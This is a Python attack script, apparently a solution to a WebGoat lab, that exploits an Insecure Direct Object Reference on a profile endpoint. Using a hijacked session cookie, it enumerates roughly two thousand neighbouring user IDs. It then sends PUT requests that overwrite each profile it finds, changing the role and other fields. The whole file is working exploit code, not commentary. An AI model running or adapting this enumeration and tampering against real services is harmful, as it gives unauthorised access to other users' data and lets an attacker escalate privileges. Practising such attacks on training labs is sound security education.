#!/usr/bin/env python

import sys
import json
import requests
import argparse


'''
        Now you can run the script by passing url and cookie as command-line arguments:

        python insecure_direct_object_reference.py --url http://www.webgoat.local:8080/WebGoat/IDOR/profile --cookie ${cookie}

        OR

        python insecure_direct_object_reference.py -u http://www.webgoat.local:8080/WebGoat/IDOR/profile -c ${cookie}
'''


class InsecureDOR:
    """
    Class to model Insecure Direct Object References (IDOR) attacks.
    """

    def __init__(self, attack_url, webgoat_cookie):
        """
        Initialize InsecureDOR class with attack url and webgoat session cookie.
        """
        self.attack_url = attack_url
        self.login_session = webgoat_cookie
        self.headers = {
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
            "Content-Type": "application/json",
            "charset": "UTF-8",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }
        self.profile = None

    def find_profile(self):
        """
        Find the profile.
        """
        print("[*] Attempting to find profile")
        cookies = {"JSESSIONID": self.login_session}
        response = requests.get(
            self.attack_url, headers=self.headers, cookies=cookies)
        self.profile = json.loads(response.text)
        print(
            f"Found username: {self.profile['name']} with user ID: {self.profile['userId']}")

    def brute_force_profiles(self):
        """
        Brute-force the profiles.
        """
        start_id = int(self.profile["userId"]) - 1000
        end_id = int(self.profile["userId"]) + 1000
        cookies = {"JSESSIONID": self.login_session}
        print(
            f"[*] Attempting to brute-force profiles, start profile id: {start_id}, end profile id: {end_id}")

        for num_id in range(start_id, end_id, 1):
            profile_url = self.attack_url + f"/{num_id}"
            response = requests.get(
                profile_url, headers=self.headers, cookies=cookies)
            profile_response = json.loads(response.text.lower())

            if "internal server error" not in profile_response and num_id != int(self.profile["userId"]):
                print(
                    f"[+] SUCCESSFULY FOUND object: {profile_response['output']}, with user id: {num_id}, feedback: {profile_response['feedback']}")

                data = {
                    "role": 2,
                    "color": "red",
                    "size": "large",
                    "name": "Buffalo Bill",
                    "userId": "2342388"
                }

                update_response = requests.put(
                    self.attack_url + f"/{num_id}",
                    headers=self.headers,
                    cookies=cookies,
                    data=json.dumps(data)
                )

                updated_profile_response = json.loads(update_response.text)
                print(
                    f"[+] SUCCESSFULY UPDATED profile: {updated_profile_response['lessonCompleted']}, feedback: {updated_profile_response['feedback']}, output: {updated_profile_response['output']}")


def main():
    parser = argparse.ArgumentParser(
        description='Pass parameters needed for attack.')
    parser.add_argument('-u', '--url', type=str, help='The URL for the attack')
    parser.add_argument('-c', '--cookie', type=str, help='The session cookie')
    args = parser.parse_args()

    session_hijack = InsecureDOR(args.url, args.cookie)
    session_hijack.find_profile()
    session_hijack.brute_force_profiles()


if __name__ == "__main__":
    main()
